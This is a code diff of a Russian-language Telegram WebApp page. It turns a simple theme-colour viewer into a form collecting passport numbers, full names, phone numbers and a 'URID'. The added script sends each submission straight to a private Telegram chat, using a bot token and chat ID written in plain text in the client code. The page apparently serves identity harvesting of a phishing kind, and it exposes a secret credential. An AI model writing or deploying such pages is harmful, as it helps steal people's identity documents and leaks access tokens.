@@ -2,101 +2,202 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <title>Цвета Telegram WebApp</title>
+  <title>Предоставление данных с цветами Telegram WebApp</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
+    /* Сброс и базовые стили */
     body {
       margin: 0;
       padding: 20px;
       font-family: sans-serif;
-      background-color: #fff;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 20px;
-      justify-content: center;
-      align-items: center;
       min-height: 100vh;
-      color: #000;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background-color: var(--bg-color, #fff);
+      color: var(--text-color, #000);
+      transition: background-color 0.3s, color 0.3s;
     }
-    .color-box {
-      width: 120px;
-      height: 120px;
+    h2 {
+      margin-bottom: 20px;
+      color: var(--text-color, #000);
+    }
+    form {
+      width: 100%;
+      max-width: 400px;
+      background-color: var(--button-color, #fff);
+      padding: 24px;
       border-radius: 12px;
       box-shadow: 0 2px 8px rgba(0,0,0,0.1);
       display: flex;
       flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      font-size: 14px;
-      font-weight: 600;
-      color: #fff;
-      user-select: none;
-      cursor: default;
-      text-align: center;
+      gap: 20px;
     }
-    .label {
-      margin-top: 8px;
-      font-size: 12px;
-      font-weight: 500;
-      color: inherit;
-      word-break: break-word;
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+    label {
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: var(--text-color, #000);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+    }
+    input {
+      border: none;
+      border-bottom: 2px solid var(--input-border-color, #ccc);
+      padding: 8px 4px;
+      font-size: 16px;
+      background: transparent;
+      color: var(--text-color, #000);
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    input::placeholder {
+      color: var(--input-placeholder-color, #999);
+    }
+    input:focus {
+      border-color: var(--button-color, #0088cc);
+    }
+    button {
+      padding: 12px;
+      background-color: var(--button-color, #0088cc);
+      color: var(--button-text-color, #fff);
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: var(--button-hover-color, #006fa1);
+    }
+    .status {
+      font-weight: 600;
+      margin-top: 10px;
+    }
+    .success {
+      color: green;
+    }
+    .error {
+      color: red;
     }
   </style>
 </head>
 <body>
+
+<h2>Предоставление данных</h2>
+<form id="dataForm" autocomplete="off">
+  <div class="input-group">
+    <label for="passkey">Паспорт</label>
+    <input type="text" id="passkey" name="passkey" maxlength="11" placeholder="0000 000000" required />
+  </div>
+  <div class="input-group">
+    <label for="fio">ФИО</label>
+    <input type="text" id="fio" name="fio" placeholder="Иванов Иван Иванович" required />
+  </div>
+  <div class="input-group">
+    <label for="phone">Номер телефона</label>
+    <input type="tel" id="phone" name="phone" placeholder="+7 999 999 99 99" required />
+  </div>
+  <div class="input-group">
+    <label for="urid">URID</label>
+    <input type="text" id="urid" name="urid" required />
+  </div>
+  <button type="submit">Отправить</button>
+  <div class="status"></div>
+</form>
 
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
   const tg = window.Telegram.WebApp;
   tg.ready();
 
-  function renderColors() {
-    document.body.innerHTML = ''; // очистить
-
+  // Задаём CSS-переменные из цветов темы Telegram
+  function applyThemeColors() {
     const theme = tg.themeParams || {};
+    const root = document.documentElement;
 
-    // Если параметров нет, добавить заглушку
-    if (Object.keys(theme).length === 0) {
-      const noData = document.createElement('div');
-      noData.textContent = 'Цветовые параметры темы недоступны';
-      noData.style.fontSize = '18px';
-      noData.style.color = '#333';
-      document.body.appendChild(noData);
+    // Пример установки переменных, подкорректируй под свою логику, если нужно
+    root.style.setProperty('--bg-color', theme.bg_color || '#fff');
+    root.style.setProperty('--text-color', theme.text_color || '#000');
+    root.style.setProperty('--button-color', theme.button_color || '#0088cc');
+    root.style.setProperty('--button-text-color', theme.button_text_color || '#fff');
+    root.style.setProperty('--button-hover-color', theme.button_hover_color || '#006fa1');
+    root.style.setProperty('--input-border-color', theme.input_border_color || '#ccc');
+    root.style.setProperty('--input-placeholder-color', theme.input_placeholder_color || '#999');
+  }
+
+  applyThemeColors();
+
+  tg.onEvent('themeChanged', applyThemeColors);
+
+  const passInput = document.getElementById('passkey');
+
+  // Автоматическое добавление пробела после 4 цифр (формат 0000 000000)
+  passInput.addEventListener('input', () => {
+    let value = passInput.value.replace(/\D/g, '');
+    if (value.length > 10) value = value.slice(0, 10);
+    if (value.length > 4) {
+      value = value.slice(0,4) + ' ' + value.slice(4);
+    }
+    passInput.value = value;
+  });
+
+  // Отправка данных в Telegram Bot
+  document.getElementById('dataForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const statusDiv = document.querySelector('.status');
+
+    const passkey = passInput.value.trim();
+    const fio = document.getElementById('fio').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const urid = document.getElementById('urid').value.trim();
+
+    if (!/^\d{4} \d{6}$/.test(passkey)) {
+      statusDiv.textContent = '❌ Неверный формат паспорта. Пример: 1234 567890';
+      statusDiv.className = 'status error';
       return;
     }
 
-    for (const [key, color] of Object.entries(theme)) {
-      const box = document.createElement('div');
-      box.className = 'color-box';
-      box.style.backgroundColor = color;
+    // Токен бота и ID чата
+    const botToken = '8112715154:AAG8UTvBi79BvqBB4Cqob95oYgJxbXpgjiY';
+    const chatId = '6222585321';
 
-      // Определим контрастный цвет текста (чёрный или белый)
-      function getContrastYIQ(hexcolor){
-        hexcolor = hexcolor.replace('#', '');
-        if(hexcolor.length === 3){
-          hexcolor = hexcolor.split('').map(c => c+c).join('');
-        }
-        const r = parseInt(hexcolor.substr(0,2),16);
-        const g = parseInt(hexcolor.substr(2,2),16);
-        const b = parseInt(hexcolor.substr(4,2),16);
-        const yiq = ((r*299)+(g*587)+(b*114))/1000;
-        return (yiq >= 128) ? '#000000' : '#FFFFFF';
+    // Текст без эмодзи и иконок
+    const message = `Новые данные:
+Паспорт: ${passkey}
+ФИО: ${fio}
+Телефон: ${phone}
+URID: ${urid}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.ok) {
+        statusDiv.textContent = '✅ Данные успешно отправлены.';
+        statusDiv.className = 'status success';
+        e.target.reset();
+      } else {
+        throw new Error(data.description);
       }
-
-      box.style.color = getContrastYIQ(color);
-
-      const label = document.createElement('div');
-      label.className = 'label';
-      label.textContent = key + "\n" + color;
-
-      box.appendChild(label);
-      document.body.appendChild(box);
-    }
-  }
-
-  renderColors();
-
-  tg.onEvent('themeChanged', renderColors);
+    })
+    .catch(error => {
+      statusDiv.textContent = '❌ Ошибка: ' + error.message;
+      statusDiv.className = 'status error';
+    });
+  });
 </script>
 
 </body>
